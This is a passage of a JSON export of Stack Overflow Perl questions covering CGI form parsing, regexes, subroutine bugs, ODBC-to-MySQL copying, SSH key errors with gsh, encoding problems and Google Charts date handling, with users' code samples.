align=\"right\"&gt;&amp;nbsp;&lt;/td&gt;\n&lt;td&gt;&lt;input type=\"submit\" value=\"Submit\"&gt;\n    &lt;input type=\"Reset\" value=\"Clear Form\"&gt;\n&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt;\n&lt;/fieldset&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>ex.pl</p>\n\n<pre><code>#!/usr/bin/perl\n\n$|=1; # Flush immediately.\n\nprint \"Content-Type: text/plain\\n\\n\";\nread STDIN, $form, $ENV{'CONTENT_LENGTH'};\n\nforeach $pair (split('&amp;', $form)) {\n\n    if ($pair =~ /(.*)=(.*)/) {  # found key=value;\n\n        ($key, $value) = ($1, $2);              # get key, value.\n        $value =~ s/\\+/ /g;                     # substitute spaces for + signs.\n        $value =~ s/%(..)/pack('c',hex($1))/eg;\n        $inputs{$key} = $value;                 # Create Associative Array.\n    }\n}\n\nforeach $item (keys(%inputs)) {\n\n    print \"$item - $inputs{$item}\\n\"; \n}\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12933603,"title":"Perl: Replace many array element with another corresponding array element in a file","body":"<p>I am trying to replace many array element with another corresponding array element in a file, but its taking ages to execute. Is there a simpler approach ? Below is my code:</p>\n\n<pre><code>open( my $in,  '&lt;', \"Test.txt\")  or die \"cannot open Test.txt $!\";\nopen( my $out, '&gt;', \"TestFinal.txt\") or die \"cannot create TestFinal $!\";\nwhile( &lt;$in&gt;)\n{ \n    for(my $i=2 ; $i&lt;=$LastRowGlossary; $i++)\n    {\n        s/$variable[$i]/$vardescription[$i]/g;\n    }\n    for(my $j=2 ; $j&lt;=$LastRowTable; $j++)\n    {\n        s/$COVERAGE_TYPE_CODE[$j]/$TCOVERAGE[$j]/g;\n        s/$CVG_TEST_CRIT_CD[$j]/$TCVG_TEST_CRIT_TYP[$j]/g;\n    }\n\n    print {$out} $_;\n\n}\nclose $in; \nclose $out;\n</code></pre>\n\n<p>Please advise.</p>\n"},{"tags":["perl","pdf","digital-signature"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":78,"score":3,"question_id":12936213,"title":"Add signature into PDF in perl","body":"<p>How can I sign a pdf file using digital signature in perl? I'm able to extract the content of pdf and to generate signature string via </p>\n\n<p># $content -> pdf content to be signed</p>\n\n<p>my $private_key Crypt::OpenSSL::RSA->new_private_key($key_string);<br/>\n$private_key->use_md5_hash();<br/>\nmy $signature = $private_key->sign($content);<br/></p>\n\n<p>Consequently, the $signature can be converted into hex format, but I don't know how to add it into PDF file. I know that the signature in hex form should be placed in /Contents field and the range of signed text is given by /ByteRange array.</p>\n\n<p>Is there any module for this purpose? Or can you give me any advice how to do it? Thanks</p>\n"},{"tags":["regex","perl","variables","eval","match"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12934806,"title":"evaluate pattern stored in variable perl regexp","body":"<p>I am trying to find out if basket has apple [simplified version of a big problem]</p>\n\n<pre><code>$check_fruit = \"\\$fruit =~ \\/has\\/apple\\/\";\n$fruit=\"basket/has/mango/\";\nif ($check_fruit) {\n       print \"apple found\\n\";\n}\n</code></pre>\n\n<p>check_fruit variable is holding the statement of evaluating the regexp.\nHowever it check_fruit variable always becomes true and shows apple found :(</p>\n\n<p>Can somebody help me here If I am missing something.</p>\n\n<p>Goal to accomplish:\nOkay so let me explain: </p>\n\n<ol>\n<li><p>I have a file with a pattern clause defined on eachline similar to: </p>\n\n<pre><code>Line1: $fruit_origin=~/europe\\\\/finland/ &amp;&amp; $fruit_taste=~/sweet/ \nLine2: similar stuff that can contain ~10 pattern checks seprated by &amp;&amp; or || with metacharacters too \n</code></pre></li>\n</ol>\n\n<p>2.I have another a list of fruit attributes from a perl hash containing many such fruits </p>\n\n<p>3 I want to categorize each fruit to see how many fruits fall into category defined by each line of the file seprately. </p>\n\n<p>Sort of fruit count /profile per line Is there an easier way to accomplish this ? Thanks a lot</p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":136,"score":0,"question_id":12932208,"title":"Perl Largest,Smallest,Average of numbers using Subroutines","body":"<p>My question in Perl:\nWrite a Perl Script with a subroutine that accepts a list of values and returns the largest,smallest and average values to the calling program.</p>\n\n<pre><code>#!/usr/bin/perl\n\nsub large_and_small {   \n    my (@numbers);\n    @numbers = @_;\n\n    my ($small, $large);\n    $large = $numbers[0];\n    $small = $numbers[0];\n\n    foreach my $i (@numbers) {\n\n        if ($i &gt; $large) {         \n\n            $large = $i;  \n        }        \n        elsif ($i &lt; $small) {\n\n            $small = $i;  \n        }\n    }\n    return ($small, $large);\n}\n\nsub avg {\n    my ($avg);\n    my ($total);\n\n    foreach (@test_array) {\n\n        $total += $_;\n    }\n    $avg = $total/scalar @test_array;\n    return $avg;\n}\n\nmy (@test_array, @ret);\n@test_array = (15, 5, 7, 3, 9, 1, 20,1 3, 9, 8, 15, 16, 2, 6, 12, 90);\n@ret = large_and_small(@test_array);\nprint \"The Largest value is \", $ret[1], \"\\n\";\nprint \"The Smallest value is \", $ret[0], \"\\n\";\nprint \"The Average value is\", avg(@test_array), \"\\n\";\n</code></pre>\n\n<p>The Output I am getting is:</p>\n\n<pre><code>The Largest value is 90\nThe Smallest value is 1\nIllegal division by zero at /tmp/135044395416028.pl line 59.\n</code></pre>\n\n<p>Where am I going wrong in the script? Please help.Thanks in advance</p>\n"},{"tags":["perl","variables"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12921676,"title":"Can I use the .perl_env file to set env variables?","body":"<p>I am new at configuring perl and I'm trying to find the best way to set some common variables. I know there are lots of ways of doing this but I want to find the \"best\" ;). I came a crossed the .perl_env file in my root dir but can't find much documentation on it. Is this a place I can keep variables like BINDIR and VARDIR  (locations that I use in my perl scripts) or is there a better way. Thanks!!</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12933270,"title":"Perl Word Sorting and Word Occurrence","body":"<p>My question in Perl is:\nPerl Script which will read the text (no punctuation or numbers) and print out a sorted list of words and the number of \ntimes each occurs in the text.\nMy script is:</p>\n\n<pre><code>#!/usr/bin/perl\n@names = qw(My name is Ashok Rao and I am the son of Shreesha Rao and Shailaja Rao);\njoin(',',@names);\nmy %count;\nforeach (@names)\n{\n if (exists $count{$_}) \n {\n  $count{$_}++;\n } \n else\n {    \n  $count{$_} = 1;\n }\n}\nmy @order = sort(@names);\nprint \"The words after sorting are:\\n\";\nprint \"@order\\n\";\nprint \"The number of times each word occurring in the text is: \\n\";\nforeach (keys %count) \n{\n print \"$_ \\t = $count{$_}\\n\";\n}\n</code></pre>\n\n<p>The Output is:</p>\n\n<pre><code>The words after sorting are:\nAshok I My Rao Rao Rao Shailaja Shreesha am and and is name of son the\nThe number of times each word occurring in the text is:\nthe = 1\nson = 1\nof = 1\nname = 1\nAshok = 1\nShailaja = 1\nis = 1\nRao = 3\nam = 1\nMy = 1\nI = 1\nand = 2\nShreesha = 1\n</code></pre>\n\n<p>But I think the SORTING part output is wrong. Word occurrence part output is correct. Please help.\nThanks in advance</p>\n"},{"tags":["python","perl","bash","shell","perlscript"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":12932298,"title":"shell script to find a string and print the current line and next line recursively","body":"<p>I have written a small script which searches the string and prints the current line. But m little confused to print the next line. I am ok with bash/perl/python</p>\n\n<pre><code>#!/bin/bash  \n\nCURRENT_DIR=`pwd`\ncnt=0\n\nfor dir in $(find $CURRENT_DIR -type d);\ndo\n\n\n    for myFile in $dir/*  \n    do \n\n    if [ -f \"$myFile\" ]; then\n        cat $myFile | while myLine=`line`\n        do\n     allFile=\"$myLine\"   \n        if echo \"$myLine\" | grep -q $1 ; then \n            echo \"$myFile\" \"$allFile\"   \"\"\n        fi  \n     #echo 'expr $count+1'\n     #echo   \"$allFile\"   \"\"\n        done #LINE  \n    fi\n    done #FILE\ndone # DIRECTORY\n</code></pre>\n"},{"tags":["perl","perlbrew"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12931965,"title":"Installing alternative perl version - module missing","body":"<p>I have a webapp which uses an older version of Perl. I therefore installed an independent Perl version using perlbrew, made a symlink /usr/bin/perlx and changed the path in all my perl files.\nHowever, I still have some problems with the additional modules that I've installed. If I try to start the webapp, I get an error message:</p>\n\n<blockquote>\n  <p>Can't locate JSON/XS.pm in @INC (@INC contains: /opt/perlbrew/perls/perl-5.10.1/lib/5.10.1/x86_64-linux /opt/perlbrew/perls/perl-5.10.1/lib/5.10.1 /opt/perlbrew/perls/perl-5.10.1/lib/site_perl/5.10.1/x86_64-linux /opt/perlbrew/perls/perl-5.10.1/lib/site_perl/5.10.1 .) at ism/readfn.pm line 42.</p>\n</blockquote>\n\n<p>According to <code>cpan -i JSON::XS</code>, the module is installed:</p>\n\n<blockquote>\n  <p>JSON::XS is up to date (2.33)</p>\n</blockquote>\n\n<p>However, <code>find /opt/ -name 'XS.pm'</code> only prints other locations:</p>\n\n<blockquote>\n  <p>/opt/perlbrew/perls/perl-5.10.1/lib/5.10.1/x86_64-linux/List/Util/XS.pm\n  /opt/perlbrew/perls/perl-5.10.1/lib/5.10.1/ExtUtils/Constant/XS.pm\n  /opt/perlbrew/build/perl-5.10.1/ext/List-Util/lib/List/Util/XS.pm\n  /opt/perlbrew/build/perl-5.10.1/lib/List/Util/XS.pm\n  /opt/perlbrew/build/perl-5.10.1/lib/ExtUtils/Constant/XS.pm\n  /opt/perlbrew/build/perl-5.10.1/t/lib/MakeMaker/Test/Setup/XS.pm</p>\n</blockquote>\n\n<p>Any idea?\nThanks in advance!</p>\n"},{"tags":["string","perl","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12931382,"title":"perl: useing commas in hash values","body":"<p>I have key value pairs as \"statement:test,data\" where 'test,data' is the value for hash. While trying to create a hash with such values, perl splits the values on the comma. Is there a way around this where strings with commas can be used as values</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":50,"score":-2,"question_id":12928035,"title":"add an option to the perl script command line","body":"<p>assume this is file.txt</p>\n\n<pre><code>Name:Lab1:Lab2:Lab3:Lab4:Lab5:Lab6:Exam1:Exam2:Final\n\nAnnette Adams :8:24:19:24:10:12:43:35:98\nMary Beard:9:30:19:23:10:14:29:39:87\nAntoinette Brown:9:16:18:22:9:12:19:31:79\n.\n.\n.\n</code></pre>\n\n<p>is it possible in <code>Perl</code> to write a script with some options which user can pass to command line and get the result.</p>\n\n<p>for example  <code>getAverage.pl -l 3 file.txt</code> prints the average of Lab3 Marks.</p>\n\n<p>if it is possible what is the overall process?</p>\n"},{"tags":["perl","fatal-error","log4perl"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":105,"score":2,"question_id":12777789,"title":"Perl: Log4Perl call log4perl in case of unhandled error","body":"<p>Is there a way in log4Perl that I can force my programs to log fatal even outside an eval clause? I want to achieve to call log4perl also in case of any unhandled program termination. Prefereably I would like to add the related error handler inside my standard module which is loaded with all my Perl programs.<br>The Perl version is currently 5.8, but I am upgrading soon.<br>\nThis the test code for the given answer. I see neither a DIE on the screen nor that die.txt is created.</p>\n\n<pre><code> use Log::Log4perl qw(get_logger);\n$a-&gt;test();\n$SIG{__DIE__} = sub {\n warn \"DIE\";\n open DIE,\"&gt;die.txt\";\n print DIE \"died\\n\";\n close DIE;\n};\n</code></pre>\n"},{"tags":["java","perl","api","search","opengrok"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12926927,"title":"Is there an OpenGrok API?","body":"<p>Is there an API for <a href=\"http://hub.opensolaris.org/bin/view/Project+opengrok/\" rel=\"nofollow\">OpenGrok</a>?\nI'm interested in mining the results in either Perl or Java.\nAt the moment, I could perform HTML scrapping against the results, but seems less-than-ideal.</p>\n\n<p>As per its website, it leverages Lucene, but no real info on how to connect to it other than via HTML.</p>\n"},{"tags":["perl","foreach"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":138,"score":5,"question_id":12927498,"title":"perl foreach behavior","body":"<p>I have just begun to learn perl and found myself stymied by the result of the following block of code:</p>\n\n<pre><code>@x = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10);\nforeach (@x) {\n    $x = pop (@x) ;\n    $y = shift (@x);\n    print (\"$x $y \\n\");\n}\n</code></pre>\n\n<p>The output is: </p>\n\n<pre><code>10 1\n9 2\n8 3\n7 4 \n</code></pre>\n\n<p>I had expected another line: <code>6 5</code>. Why is there not such a line? Is it because after the iteration that prints <code>7 4</code>, the number of elements left in the array is equal to the number of iterations already completed, and so as far as perl is concerned, the loop is done? Thanks for your help!</p>\n"},{"tags":["regex","perl","unicode"],"answer_count":2,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":116,"score":7,"question_id":12358714,"title":"Why does this regex with a 2-byte unicode char emit \"uninitialized\" warning for the lvalue on match?","body":"<p>The following code:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse utf8;\nuse strict;\nuse warnings;\nuse 5.012; # implicitly turn on feature unicode_strings\nmy $test = \"some string\";\n$test =~ m/.+\\x{2013}/x;\n</code></pre>\n\n<p>Yields:</p>\n\n<blockquote>\n  <p>Use of uninitialized value <code>$test</code> in pattern match <code>(m//)</code> at test.pl line 9.</p>\n</blockquote>\n\n<p>This seems to happen with any 2-byte character inside <code>\\x{}</code>. The following regexes work fine: </p>\n\n<pre><code>/a+\\x{2013}/\n/.*\\x{2013}/\n/.+\\x{20}/\n</code></pre>\n\n<p>Also, the error goes away with <code>use bytes</code>, but using that pragma is <a href=\"http://perldoc.perl.org/bytes.html\" rel=\"nofollow\">discouraged</a>. What's going on here?</p>\n"},{"tags":["regex","perl","perl-critic"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":62,"score":3,"question_id":12924966,"title":"Perl Regex To convert String to Hex Warns of uninitialized value or to use /x","body":"<p>I am using regex in perl to convert string to hex, however, when I do this, I get a warning from either perl critic or perl:</p>\n\n<pre><code>#$test is defined, i just put the regex code snippet here...\n#this will trigger a warning from perl critic\n#warning: use of regex expression without \"/x\" expression..\n$text =~  s/(.)/sprintf(\"%x\",ord($1))/eg;\n\n#this will trigger a a warning at run time \n#warning: \"uninitialized value $1 in regexp compilation\"\n$text =~   m{s/(.)/sprintf(\"%x\",ord($1))/eg}x;\n</code></pre>\n\n<p>Is there a way to write the above code that doesn't get a warning or feedback from Perl critic? </p>\n\n<p>I think the issue is because ord is handling the undefined values, and when you put in /x then checking of the regex expression thinks that the value of $1 is invalid .</p>\n"},{"tags":["perl","unit-testing"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":77,"score":2,"question_id":12923821,"title":"Perl release tests vs install time tests","body":"<p>I'm writing a Perl module that I want to upload to CPAN soon.  I have written a test suite for it to make sure I don't break anything between releases.  What kind of tests should be run at install time versus only at release time?  The only ones I can really nail down that are release time only are POD checkers, Perl critic checks, etc.</p>\n"},{"tags":["sql-server","perl","odbc"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":12923462,"title":"PERL with Win32:ODBC/DBI reads many tables fine, then one returns nothing","body":"<pre><code>##Read table staStations\nif ($mssqldb-&gt;Sql(\"SELECT stationID, security, dockingCostPerVolume, maxShipVolumeDockable, officeRentalCost, operationID, stationTypeID, corporationID, solarSystemID, constellationID, regionID, stationName, reprocessingEfficiency, reprocessingStationsTake, reprocessingHangarFlag\n FROM staStations\")) {\n    print \"SQL Error: \" . $mssqldb-&gt;Error() . \"\\n\";\n    $mssqldb-&gt;disconnect;\n    exit;\n}\n\n\n# Read table staStations\n$count = 0 ;\n\nwhile ($mssqldb-&gt;FetchRow) {\n    my ($stationID, $security, $dockingCostPerVolume, $maxShipVolumeDockable, $officeRentalCost, $operationID, $stationTypeID, $corporationID, $solarSystemID, $constellationID, $regionID, $stationName, $reprocessingEfficiency, $reprocessingStationsTake, $reprocessingHangarFlag) = $mssqldb-&gt;Data();  ### Get data values from the row\n    $stationName =~ s/\\'/\\&amp;apos;/g;\n    $mysqlconnect-&gt;do(\"INSERT INTO staStations(stationID, security, dockingCostPerVolume, maxShipVolumeDockable, officeRentalCost, operationID, stationTypeID, corporationID, solarSystemID, constellationID, regionID, stationName, reprocessingEfficiency, reprocessingStationsTake, reprocessingHangarFlag)\n    VALUES ('$stationID', '$security', '$dockingCostPerVolume', '$maxShipVolumeDockable', '$officeRentalCost', '$operationID', '$stationTypeID', '$corporationID', '$solarSystemID', '$constellationID', '$regionID', '$stationName', '$reprocessingEfficiency', '$reprocessingStationsTake', '$reprocessingHangarFlag') ;\");\n    $count = $count + 1 ;\n    print $count . \" Rows into staStations \\n\" ;\n\n}\n</code></pre>\n\n<p>that 1st part works fine</p>\n\n<pre><code>    if ($mssqldb-&gt;Sql(\"SELECT iconID, iconFile, description FROM eveIcons\")) {\n    print \"SQL Error: \" . $mssqldb-&gt;Error() . \"\\n\";\n    $mssqldb-&gt;disconnect;\n    exit;\n}\n\n\n\n# write table eveIcons\nforeach ($mssqldb-&gt;FetchRow()) {\n    my ($iconID, $iconFile, $description) = $mssqldb-&gt;Data();  ### Get data values from the row\n    $description =~ s/\\'/\\&amp;apos;/g;\n    #$iconFile  =~ s/\\_/\\&amp;#95;/g;\n    print \"iconID: \" . $iconID . \"\\n\" ;\n    print \"file: \" . $iconFile . \"\\n\" ;\n    print \"desc: \" . $description . \"\\n \\n\" ;\n    $mysqlconnect-&gt;do(\"INSERT INTO eveIcons(`iconID`, `iconFile`, `description`)\n    VALUES ('$iconID', '$iconFile', '$description') ;\");\n    $count = $count + 1 ;\n    print $count . \" Rows into eveIcons \\n\" ;\n}\n</code></pre>\n\n<p>can't find a problem, but nothing is returned\nthis reads no data..</p>\n\n<p>it places a \"0\" in the first column of my MySql table</p>\n\n<p>there is 1689 records in the MSSQL table,  what am i doing worng??</p>\n"},{"tags":["perl","cluster-computing"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":278,"score":1,"question_id":2186436,"title":"gsh - Global Shell: Where do you put the shared keys, password?","body":"<p>I'm trying to use the <code>gsh</code> command on ubuntu to do some embarrassingly parallel stuff.  I've made an <code>/etc/ghosts</code> file containing all the IP addresses for the hosts, and each host has an account that I created just for \"cluster\" purposes.</p>\n\n<p>However, when I try a command such as,</p>\n\n<pre><code>$ gsh -l cluster ok 'echo $host'\n</code></pre>\n\n<p>I get in return two errors,</p>\n\n<pre><code>hostn: Host key verification failed.\n\nhostn+1: Permission denied (publickey,password,keyboard-interactive)\n</code></pre>\n\n<p>I've already SSH'ed these computers and exchanged keys.  I can't find anything in the <code>gsh</code> man page about a key file.  Also, there is the question of where to put the password.</p>\n\n<p>This is the version that I am using: <a href=\"http://outflux.net/software/pkgs/gsh/\" rel=\"nofollow\">http://outflux.net/software/pkgs/gsh/</a></p>\n\n<p>If you can't answer, then maybe you can suggest an alternative.</p>\n"},{"tags":["perl","hadoop"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12920907,"title":"In Perl on Hadoop, how to get file of file being processed by mapper?","body":"<p>In Hadoop, I am passing in a directory/* with various files. The names of the files are important for the processing of the data. I need this solution in Perl.</p>\n\n<p>I believe the Java equivalent is job.get(\"map.input.file\"). I looked for about 45 minutes and I can't find the Perl solution.</p>\n\n<p>Thank you,\nKevin</p>\n"},{"tags":["perl","networking","tcp","ping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12918449,"title":"Perl ping with tcp protocol","body":"<p>I am using the perl module Net::Ping to ping a set of remote hosts. I am using the default protocol, i.e. the tcp one. I am unable to ping 1 particular remote machine using this protocol. </p>\n\n<p>Unix ping works fine, and so does the icmp protocol. </p>\n\n<p>What could be the reason of this failure? Is there any setting I need to do on the host?</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","r","data.table","plyr","reshape"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":120,"score":1,"question_id":12629287,"title":"Melt a table (data.frame) based on values of comma-separated character vector column","body":"<p>I'm doing an experiment where I have \"regions\" with some associated statistic (actually many other statistics and descriptive columns), and a comma-separated list of genes that lie in those regions. This list will be variable in number, and may not contain anything (\"NA\").</p>\n\n<p>How can I \"melt\" table a:</p>\n\n<pre><code>  region_id  statistic      genelist\n          1        2.5       A, B, C\n          2        0.5    B, C, D, E\n          3        3.2          &lt;NA&gt;\n          4        0.1          E, F\n</code></pre>\n\n<p>To create another table with a separate entry for each gene in the list of genes? I.e.</p>\n\n<pre><code>   region_id statistic gene\n           1       2.5    A\n           1       2.5    B\n           1       2.5    C\n           2       0.5    B\n           2       0.5    C\n           2       0.5    D\n           2       0.5    E\n           3       3.2 &lt;NA&gt;\n           4       0.1    E\n           4       0.1    F\n</code></pre>\n\n<p>I'm guessing there's a way to do this with R/plyr, but I'm not sure how. Thanks in advance.</p>\n\n<p>Edit:</p>\n\n<p>Using R you can recreate these toy vectors with this code:</p>\n\n<pre><code>a &lt;- structure(list(region_id = 1:4, statistic = c(2.5, 0.5, 3.2, \n0.1), genelist = structure(c(1L, 2L, NA, 3L), .Label = c(\"A, B, C\", \n\"B, C, D, E\", \"E, F\"), class = \"factor\")), .Names = c(\"region_id\", \n\"statistic\", \"genelist\"), class = \"data.frame\", row.names = c(NA, \n-4L))\n\nb &lt;- structure(list(region_id = c(1L, 1L, 1L, 2L, 2L, 2L, 2L, 3L, \n4L, 4L), statistic = c(2.5, 2.5, 2.5, 0.5, 0.5, 0.5, 0.5, 3.2, \n0.1, 0.1), gene = structure(c(1L, 2L, 3L, 2L, 3L, 4L, 5L, NA, \n5L, 6L), .Label = c(\"A\", \"B\", \"C\", \"D\", \"E\", \"F\"), class = \"factor\")), .Names = c(\"region_id\", \n\"statistic\", \"gene\"), class = \"data.frame\", row.names = c(NA, \n-10L))\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":54,"score":-1,"question_id":12923763,"title":"How to access a value only in one line of a file inside a while loop?","body":"<p>I have the following file:</p>\n\n<pre><code>10001;02/07/98;;PI;M^12/12/59^F^^SP^09/12/55\n;;;;;M1|F1|SP1;11;10;12;10;12;11;1.82;D16S539\n;;;;;M1|F1|SP1;8;8;8;8;10;8;3.45;D7S820\n;;;;;M1|F1|SP1;14;12;12;11;14;11;1.57;D13S317\n;;;;;M1|F1|SP1;12;12;13;12;13;8;3.27;D5S818\n;;;;;M1|F1|SP1;12;12;12;12;12;8;1.51;CSF1PO\n.\n.\n.\n</code></pre>\n\n<p>When I run the code below, I get printed one value of <code>$indiv[0]</code> for each line of my file (in this case: <code>M1M1M1M1M1M1...</code>). I just want to use one of these values, it could be the first, last one, etc. I know I could use <code>print $indiv[0]</code> outside the loop and get the last one, but that's not the case, the <code>print</code> here is just an example, I need to use the value for other computations inside the loop.</p>\n\n<p>So, how can I access only one value (for only one line), keeping it inside the while loop?</p>\n\n<p>Thanks in advance!</p>\n\n<pre><code>#!usr/bin/perl\nuse warnings;\nuse strict;\n\nmy @indiv = ();\n\nopen FILE, $ARGV[0] or die $!;\n\nwhile (&lt;FILE&gt;) {\nchomp;\nmy @field = split /;/;\n    if ($field[0] eq '') {@indiv = split /\\|/, $field[5];  \n    print $indiv[0];\n    }\n}\n</code></pre>\n"},{"tags":["python","perl"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":7,"view_count":131,"score":-6,"question_id":12920856,"title":"Count lines in a file","body":"<p>I have a text file that consists of million of vectors like this:-</p>\n\n<pre><code>V1\nV1\nV1\nV3\nV4\nV1\nV1\n</code></pre>\n\n<p>Note:- ORDER is important. In the above output file, i counted the first vector 3 times. The same pattern is repeated twice after 5th line. There count should be different.</p>\n\n<p>I want to count how many times each vector line is repeated and add it in the output text file like this:-</p>\n\n<p>In above 7 vectors, first 3 lines are same and rest 2 are different and then last lines are same. So the output should look like this:-</p>\n\n<pre><code>V1 count 3\nV3\nV4\nV1 count 2\n</code></pre>\n\n<p>Although, first and last patterns are same but they are counted differently because they are in different order.</p>\n\n<p>I can use python or perl.I know the maximum length of rows (vectors) but how do I compare each row (vector) with other. Please help</p>\n"},{"tags":["perl","active-directory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":41,"score":-1,"question_id":12923121,"title":"Searching AD for email addresses by Organizational Unit","body":"<p>I have a Perl script that is meant to search AD for email addresses. </p>\n\n<p><a href=\"https://www.itefix.no/i2/content/extracting-e-mail-addresses-active-directory\" rel=\"nofollow\">I used this script from here</a> however I'd like to modify it to search a specific org unit for all email addresses ending in .com, rather than scraping all email addresses in general.</p>\n\n<p>Note: I have zero Perl experience, I usually only do Python but can't figure it out in Python, Googled how to do it in Perl and got an instant result that worked.</p>\n"},{"tags":["perl","character-encoding"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12921882,"title":"Unable to yield russian characters the same as input in perl on windows environment","body":"<p>I have a set of russian string which I am passing as a input to a perl script to store the same into database but when I print the same string on windows console I get characters from input. Also, the database has different characters inserted in the column. Could you please share some pointers for the issue.</p>\n"},{"tags":["perl","documentation","technical-writing"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":120,"score":0,"question_id":12922166,"title":"Is \"Perl\" an acronym?","body":"<p>I'm writing some reports that describe my company's IT infrastructure, and I need to explain Perl to business people who likely are not familiar with it. My audience is non-technical, non-IT management and supervisors who only have a passing familiarity with IT terms and concepts.</p>\n\n<p><a href=\"http://learn.perl.org/faq/perlfaq1.html#Whats-the-difference-between-perl-and-Perl-\" rel=\"nofollow\">The Perl FAQ says \"Perl\" is not an acronym</a>, but <a href=\"http://perldoc.perl.org/perl.html#DESCRIPTION\" rel=\"nofollow\">the documentation says that it is</a>. This confuses me, and I'm not sure if I should refer to it as Perl or as Practical Extraction and Report Language. And if the former, I'm wondering if I should expand Perl to Practical Extraction and Report Language in the glossary, much like someone would explain that CPU is Central Processing Unit.</p>\n\n<p>What's the real position on Perl's formal name? Is Perl just \"Perl\" like the FAQ states or is it really \"Practical Extraction and Report Language\" like the documentation states? Assuming the documentation is correct, when it says it \"officially stands for Practical Extraction and Report Language, except when it doesn't\", what are the conditions under which it doesn't? Is there a style guide for when I should use the abbreviated name \"Perl\" versus the full name \"Practical Extraction and Report Language\" when I am writing documents?</p>\n"},{"tags":["javascript","json","perl","google-charts"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":643,"score":0,"question_id":9379124,"title":"sending JSON dates to google charts API from Perl","body":"<p>I have a small dancer application which serves up some HTML (including the javascript to call the google charts API) and for other URLs queries a database and returns the data in encoded JSON in a form you can pass to google.visualization.DataTable. The javascript queries the dancer app for the JSON data then passes it into the google charts API - A simplified version is:</p>\n\n<pre><code>    &lt;script type=\"text/javascript\" src=\"https://www.google.com/jsapi\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\" src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\"&gt;\n\n      google.load('visualization', '1.0', {'packages':['corechart']});\n      google.setOnLoadCallback(initialize);\n\nfunction initialize() {\n    var res = $.ajax({\n        url: \"/data/2\",\n        dataType:\"json\",\n        async: false,\n        data: \"{}\",\n        contentType: \"application/json\",\n        error: function(jqXHR, textStatus, errorThrown) {\n             alert('textStatus ' + textStatus);\n             alert('errorThrown ' + errorThrown);\n        }\n    });\n    jsonData = res.responseText;\n    var data = new google.visualization.DataTable(jsonData);\n\n    var chart = new google.visualization.BarChart(document.getElementById('chart_div'));\n    chart.draw(data, {width: 400, height: 240});\n\n}\n    &lt;/script&gt;\n</code></pre>\n\n<p>The problem is that some of the data returned by the Perl includes dates/timestamps and so should have the type set to \"datetime\":</p>\n\n<pre><code>{\"rows\":[{\"c\":[{\"v\":\"WHAT_CAN_I_PUT_HERE\"},{\"v\":\"2095\"}]}],\"cols\":[{\"type\":\"datetime\",\"label\":\"DTU\"},{\"type\":\"number\",\"label\":\"COUNT\"}]}\n</code></pre>\n\n<p>In Javascript you could create a date to pass to the google charts API with:</p>\n\n<pre><code>new Date(2012, 1, 08, 09, 32, 0)\n</code></pre>\n\n<p>How can I send a date encoded in JSON from Perl such that the google charts API understands it? If you cannot what other options might be available to me?</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":12921151,"title":"How do I remove duplicate values from an array in Perl?","body":"<p>I have multiple values for each key in the hash. Here, I print the values of each key</p>\n\n<pre><code>print \"$var:\",join ',',@{$hash{$var}},\"\\n\";\n</code></pre>\n\n<p>Output of the above print statement is:</p>\n\n<pre><code>ABC:1,2,3,1,4,2,\nDEF:9,3,4,5,3,5,\n</code></pre>\n\n<p>Now, I want to remove duplicates in the values. The desired output is,</p>\n\n<pre><code>ABC:1,2,3,4\nDEF:9,3,4,5\n</code></pre>\n\n<p>Can someone help me in 